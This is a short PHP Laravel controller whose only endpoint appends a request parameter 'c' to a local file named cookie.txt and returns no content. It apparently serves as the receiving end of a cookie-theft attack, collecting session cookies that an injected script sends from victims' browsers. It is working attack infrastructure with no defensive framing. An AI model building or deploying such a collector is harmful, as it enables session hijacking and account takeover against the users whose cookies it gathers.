<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Response;
use Illuminate\Support\Facades\Storage;

class CookieController extends Controller
{
    public function store(Request $request)
    {
        Storage::disk('local')->append('cookie.txt', $request->get('c'));

        return Response::noContent();
    }
}
